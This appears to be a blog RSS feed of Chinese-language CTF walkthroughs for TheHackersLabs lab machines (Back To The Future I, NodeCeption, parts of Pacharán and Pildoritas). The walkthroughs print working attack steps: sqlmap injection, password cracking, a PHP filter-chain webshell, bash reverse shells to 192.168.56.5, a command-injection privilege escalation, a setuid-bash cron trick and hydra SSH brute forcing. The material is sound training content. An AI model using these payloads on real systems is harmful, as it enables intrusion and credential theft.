nt authority\system
```

成功拿到 `system` 用户权限

这里可以使用 `msf` 来弹，不多赘述….

最后运行恶意 `exe` 即可弹回来

![image.png](/post-images/TheHackersLabsPacharán/image7.png)

```bash
C:\Users\Administrador\Desktop>type root.txt
type root.txt
cfa7cb1cc20e26c0428f9222d44c76a0  -
```

## 总结

打印机那里有点没想到，要看描述

最后 SeLoadDriverPrivilege 卡了一下，`payload`需要改一下]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>SeLoadDriverPrivilege</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Back To The Future I]]></title>
            <link>https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I</guid>
            <pubDate>Sat, 26 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Back To The Future I https://labs.thehackerslabs.com/machine/119 Recon PortScan 枚举 FTP 匿名 HTTP 服务 查看源码能找到 目录爆破 about.php logs.php time machine.php ？EI...]]></description>
            <content:encoded><![CDATA[
# Back To The Future I

> https://labs.thehackerslabs.com/machine/119
> 

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png)

## Recon

### PortScan

```bash
➜  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST
Nmap scan report for 192.168.56.94
Host is up (0.00056s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.52 seconds
```

```bash
➜  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST
Nmap scan report for 192.168.56.94
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)
|_  256 fc:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://hillvalley.thl/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
MAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.56.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
```

### 枚举

`FTP` 匿名

```bash
➜  Back_To_The_Future_I ftp 192.168.56.94
Connected to 192.168.56.94.
220 (vsFTPd 3.0.3)
Name (192.168.56.94:root): anonymous
530 Permission denied.
ftp: Login failed
```

`HTTP` 服务

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png)

查看源码能找到

```bash
  <!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->
  <!-- 塔钟跟这事儿一点关系都没有！或者说，有关系？-->
```

目录爆破

```bash
➜  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a
sp,php,txt,zip                                                                                  
                                                                                                
 ___  ___  __   __     __      __         __   ___                           
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                               
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                              
by Ben "epi" Risher 🤓                 ver: 2.11.0                                                                                                                                              
───────────────────────────┬──────────────────────                                                                                                                                              
 🎯  Target Url            │ http://hillvalley.thl/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [asp, php, txt, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css
200      GET       69l      176w     2948c http://hillvalley.thl/index.php
200      GET       69l      176w     2948c http://hillvalley.thl/
200      GET        3l       28w      240c http://hillvalley.thl/about.php
302      GET        0l        0w        0c http://hillvalley.thl/admin.php => index.php
301      GET        9l       28w      314c http://hillvalley.thl/css => http://hillvalley.thl/css/
301      GET        9l       28w      314c http://hillvalley.thl/img => http://hillvalley.thl/img/
200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png
301      GET        9l       28w      313c http://hillvalley.thl/js => http://hillvalley.thl/js/
200      GET       23l       61w      838c http://hillvalley.thl/js/index.js
302      GET        0l        0w        0c http://hillvalley.thl/logout.php => index.php
200      GET        0l        0w        0c http://hillvalley.thl/config.php
200      GET        6l       25w      216c http://hillvalley.thl/logs.php
200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png
200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php
[####################] - 79s  1038210/1038210 0s      found:15      errors:0      
[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ 
[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ => Directory listing (add --scan-dir-listings to scan)
```

`about.php`

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png)

`logs.php`

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png)

`time_machine.php`

 ？EI Psy Kongroo ~

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png)

没找到信息，尝试爆破登录框，也是不成功

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png)

测试一下登录框

发现存在 `SQL` 注入

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png)

## SQL 注入

直接上 `SQLmap` ，测试出来 延时注入

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png)

将数据都爆出来

```bash
current user: 'marty@localhost'
current database: 'hillvalley'

Database: hillvalley
[1 table]
+-------+
| users |
+-------+

+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |
+----+--------------------------------------------------------------+----------+
```

将密码进行爆破

```bash
➜  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (?)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

得到一个账户 `marty`:`andromeda`

## 文件包含

登录进去后台

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png)

得到一些关于密码信息

```bash
我实施了一项基本的安全措施来保护关键的项目文件。
我使用了与我的时光机和第一次跳跃的日期相关的密码。

马蒂永远不会忘记那一天。

——医生
```

我们还注意到`URL`是貌似是包含文件的，我们尝试一下包含一下别的文件

成功将 `/etc/passwd` 包含出来

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png)

可以直接将 `user.txt` 给包含出来

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png)

但我们的目的是拿到 `shell` 

测试伪协议是否可以使用

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png)

我们尝试通过 `php://filter/write` 来写入文件，但是并没有成功

```bash
php://filter/write=convert.base64-decode/resource=shell.php&data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=
```

通过：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md

能到一个工具 **PHP filter chain generator**：https://github.com/synacktiv/php_filter_chain_generator

生成 `payload`：

```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
```

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png)

生成反弹 `shell` 的代码：

```bash
	python3 php_filter_chain_generator.py --chain '<?php eval(system($_GET["x"])); ?>  '
```

测试代码执行

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png)

进行反弹 `shell`

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'
```

拿到立足点

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png)

## To Marty

查看配置文件

```bash
www-data@hillvalley:/var/www/project/app$ cat config.php 
<?php
$host = "localhost";
$user = "marty";
$pass = "t1m3travel";
$db = "hillvalley";

$conn = mysqli_connect($host, $user, $pass, $db);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
?>
```

拿到数据库账号密码，因为用户名是 `marty` ，我们顺便碰撞一下密码

```bash
www-data@hillvalley:/var/www/project/app$ su marty
Password: 
marty@hillvalley:/var/www/project/app$ 
```

成功切换到用户`Marty`

我们写入 `SSH` 公钥，使用公钥进行登录

## To docbrown

家目录下的隐藏文件

```bash
marty@hillvalley:~$ cat .flux_notes 
Tiempos inestables... aún necesito arreglar el runner para la próxima prueba.
```

> 时间不稳定...仍然需要修复运行器以进行下一次测试。
> 

能直接看`docbrown`的家目录

```bash
marty@hillvalley:/home/docbrown$ ls -al
total 88
drwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .
drwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..
lrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -> /dev/null
-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout
-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc
drwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache
drwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config
-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face
lrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -> .face
-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint
drwx------  4 docbrown docbrown 4096 Jul 11 22:08 .local
drwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla
-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile
-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates
drwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos
drwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs
```

`.flux_hint`

```bash
marty@hillvalley:/home/docbrown$ cat .flux_hint 
He estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.
```

> 我一直在研究一种同步系统脚本的新方法。分分秒秒……精准无误。
> 

提到了同步系统脚本，我们上`pspy`看看

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png)

注意到 **`/usr/local/bin/flux_admin.sh`**

但是根目录中也是没有

```bash
marty@hillvalley:/usr/local/bin$ ls -al
total 40
drwxr-xr-x  2 root root  4096 Jul 14 21:53 .
drwxr-xr-x 10 root root  4096 Jul 11 21:56 ..
-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner
-rwx------  1 root root 16296 Jul 14 20:44 time_daemon
```

上 `linpeas.sh` 看看

可以注意到如下信息

```bash
Files with capabilities (limited to 50): 
/usr/local/bin/backup_runner cap_setuid=ep 
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep 
```

当程序 `backup_runner` 运行时一些拥有 `setuid` 权限，可以以其他用户权限运行

我们将其拉出去分析一下

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  const char *v5; // [rsp+118h] [rbp-8h]

  if ( argc != 2 )
    usage(argc, argv, envp);
  v5 = argv[1];
  snprintf(s, 0x100uLL, "tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs", v5);
  setuid(0x3E8u);
  system(s);
  return 0;
}
```

其中的 `setuid(0x3E8u);` 也就是 `1000` ，而 `1000` 刚好是 `docbrown`

并且执行的命令是 `tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs`

该程序存在命令注入，因为 `v5` 并没有被处理，而是直接被调用

```bash
"; id ;"
```

```bash
marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner "; id ;"
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
sh: 1: -backup.tar.gz: not found
```

获得 `docbrown` 的 `shell`

```bash
marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner "; /bin/bash -p ;"
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information.
docbrown@hillvalley:/home/docbrown$ 
```

## To Root

查看 `sudo` 权限

```bash
docbrown@hillvalley:/home/docbrown$ sudo -l
Matching Defaults entries for docbrown on hillvaley:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
```

我们尝试运行一下

```bash
[FLUX] No existe el archivo /tmp/sync: No such file or directory
```

```bash
docbrown@hillvalley:/tmp$ vim sync
docbrown@hillvalley:/tmp$ sudo time_daemon
[88MPH] Sincronización completada. Listo para viajar.
```

![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png)

貌似是创建定时任务

我们将提权语句写入 `/tmp/sync` 并运行 `time_deamon`

```bash
docbrown@hillvalley:/tmp$ echo "chmod +s /bin/bash" > /tmp/sync

docbrown@hillvalley:/usr/local/bin$ sudo /usr/local/bin/time_daemon
[88MPH] Sincronización completada. Listo para viajar.
```

等在 `pspy` 显示运行计划任务，再查看

```bash
docbrown@hillvalley:/usr/local/bin$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash
```

最后读取 `root.txt`

```bash
bash-5.2# cat notes.txt 
¡Felicidades, viajero del tiempo!

Lograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstáculos temporales y... 
¡volviste al futuro con todos los flags en el DeLorean!

Doc estaría orgulloso, y Marty… bueno, seguro todavía está en problemas con Biff. 
Pero vos… vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.

    “El futuro no está escrito, todavía. El tuyo será exactamente como lo hagas.”
    — Doc Emmett Brown

Gracias por jugar este CTF inspirado en una de las mejores trilogías de todos los tiempos. 

Si disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los próximos desafíos que se vienen en la saga.

bash-5.2# cat root.txt 
FLAGxxxxxxxxxxxxxxxxxxxxxx
```

## 总结

难度还好，就是有些地方会卡住]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>SQLInjection</category>
            <category>FileInclude</category>
            <category>CommandInjection</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - NodeCeption]]></title>
            <link>https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption</guid>
            <pubDate>Fri, 25 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[NodeCeption https://labs.thehackerslabs.com/machine/118 Recon PortScan 枚举测试 8765 Apache默认页面 5678 n8n n8n 可以反弹 shell，但是要进入后台，并且需要邮箱和密码 密码爆破 我么寻找一下哪里能找到...]]></description>
            <content:encoded><![CDATA[
# NodeCeption

> https://labs.thehackerslabs.com/machine/118
> 

![image.png](/post-images/TheHackersLabsNodeCeption/image.png)

## Recon

### PortScan

```bash
➜  NodeCeption nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:09 CST
Nmap scan report for 192.168.56.1
Host is up (0.00034s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00028s latency).
MAC Address: 08:00:27:BE:8A:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.88
Host is up (0.00058s latency).
MAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds
```

```bash
➜  NodeCeption nmap -sT -min-rate 10000 -p- 192.168.56.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:11 CST
Nmap scan report for 192.168.56.88
Host is up (0.00070s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5678/tcp open  rrac
8765/tcp open  ultraseek-http
MAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.73 seconds
```

```bash
➜  NodeCeption nmap -sT -A -p 22,5678,8765 192.168.56.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:12 CST
Nmap scan report for 192.168.56.88
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)
|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)
5678/tcp open  rrac?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=86400
|     Last-Modified: Fri, 25 Jul 2025 12:09:30 GMT
|     ETag: W/"7b7-198417d0a9c"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1975
|     Vary: Accept-Encoding
|     Date: Fri, 25 Jul 2025 12:12:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <script type="module" crossorigin src="/assets/polyfills-B8p9DdqU.js"></script>
...
8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5678-TCP:V=7.95%I=7%D=7/25%Time=688374B9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8DC,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCach
SF:e-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x2025\
SF:x20Jul\x202025\x2012:09:30\x20GMT\r\nETag:\x20W/\"7b7-198417d0a9c\"\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201975
SF:\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2025\x20Jul\x202025\x201
SF:2:12:38\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n\t<head>\n\t\t<script\x20type=\"module\"\x20crossorig
SF:in\x20src=\"/assets/polyfills-B8p9DdqU\.js\"></script>\n\n\t\t<meta\x20
SF:charset=\"utf-8\"\x20/>\n\t\t<meta\x20http-equiv=\"X-UA-Compatible\"\x2
SF:0content=\"IE=edge\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\
SF:"width=device-width,initial-scale=1\.0\"\x20/>\n\t\t<link\x20rel=\"icon
```

### 枚举测试

`8765` `Apache`默认页面

![image.png](/post-images/TheHackersLabsNodeCeption/image1.png)

`5678` `n8n`

![image.png](/post-images/TheHackersLabsNodeCeption/image2.png)

`n8n` 可以反弹 `shell`，但是要进入后台，并且需要邮箱和密码

## 密码爆破

我么寻找一下哪里能找到信息

`8765` 源码中得到信息

![image.png](/post-images/TheHackersLabsNodeCeption/image3.png)

> usuario@maildelctf.com
希望您已按照说明更改密码。
请记住：密码至少 8 个字符，至少包含 1 个数字和 1 个大写字母。
> 

得到一个邮箱和密码策略

通过AI 写出正则表达式，然后匹配 `rockyou` 前 `5000` 的字典

```bash
➜  NodeCeption head -n 5000 /usr/share/wordlists/rockyou.txt | grep -P '^(?=.*\d)(?=.*[A-Z]).{8,}$'                                                                          
Password1
PASSWORD1
```

使用 `usuario@maildelctf.com`:`Password1` 可以登录进去

![image.png](/post-images/TheHackersLabsNodeCeption/image4.png)

## n8n 后台利用

通过工作流运行命令

![image.png](/post-images/TheHackersLabsNodeCeption/image5.png)

测试一下

![image.png](/post-images/TheHackersLabsNodeCeption/image6.png)

成功访问

![image.png](/post-images/TheHackersLabsNodeCeption/image7.png)

反弹 `shell` ，这里没法用`nc` 弹

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'
```

![image.png](/post-images/TheHackersLabsNodeCeption/image8.png)

拿到立足点

```bash
➜  NodeCeption nc -lvp 1234
listening on [any] 1234 ...
192.168.56.88: inverse host lookup failed: Unknown host
connect to [192.168.56.5] from (UNKNOWN) [192.168.56.88] 48536
bash: cannot set terminal process group (2231): Inappropriate ioctl for device
bash: no job control in this shell
thl@nodeception:~$ 
```

当前目录中可以拿到 `user.txt`

```bash
thl@nodeception:~$ cat user.txt 
THL_wxxxxxxxxxxxxxxxxxxx
```

## 权限提升

一看用户组

```bash
thl@nodeception:~$ id
uid=1000(thl) gid=1000(thl) groups=1000(thl),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```

再看 `sudo` 权限

```bash
thl@nodeception:~$ sudo -l
Matching Defaults entries for thl on nodeception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User thl may run the following commands on nodeception:
    (ALL) NOPASSWD: /usr/bin/vi
    (ALL : ALL) ALL
```

但是执行时需要我们提供密码

尝试`hydra`爆破

```bash
➜  NodeCeption hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.88 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 20:54:04
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.56.88:22/
[22][ssh] host: 192.168.56.88   login: thl   password: basketball
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 20:54:27
```

得到密码 `basketball`

结束

```bash
thl@nodeception:~$ sudo cat /root/root.txt
[sudo] password for thl: 
THL_xxxxxxxxxxxxxxxxxxx
```

## 总结

梭哈]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>n8n</category>
            <category>hydra</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Pildoritas]]></title>
            <link>https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas</guid>
            <pubDate>Thu, 24 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Pildoritas https://labs.thehackerslabs.com/machine/67 Recon PortScan 这次不打 AD 域 枚举测试 SMB 匿名枚举 Vulnserver 从nmap 中的扫描结果能知道搭建着 Vulnserver 项目链接：https://git...]]></description>
            <content:encoded><![CDATA[
# Pildoritas

> https://labs.thehackerslabs.com/machine/67
> 

![image.png](/post-images/TheHackersLabsPildoritas/image.png)

## Recon

### PortScan

```bash
➜  Pildoritas nmap -sn 192.168.56.0/24               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST
Nmap scan report for 192.168.56.1
Host is up (0.00052s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00037s latency).
MAC Address: 08:00:27:31:BB:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.93
Host is up (0.00069s latency).
MAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.09 seconds
```

这次不打 `AD` 域

```bash
➜  Pildoritas nmap -sT -min-rate 10000 -p- 192.168.56.93    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST
Warning: 192.168.56.93 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.93
Host is up (0.00029s latency).
Not shown: 65267 closed tcp ports (conn-refused), 257 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9999/tcp  open  abyss
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
```

```bash
➜  Pildoritas nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:11 CST                                                                                                                                 
Nmap scan report for 192.168.56.93                                                              
Host is up (0.00035s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 7.0
|_http-title: 404: archivo o directorio no encontrado.
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9999/tcp open  vulnserver    Vulnserver
MAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_clock-skew: 6h59m57s
| smb2-time: 
|   date: 2025-07-24T21:12:18
|_  start_date: 2025-07-24T20:57:33
|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.56.93
```

### 枚举测试

`SMB` 匿名枚举

```bash
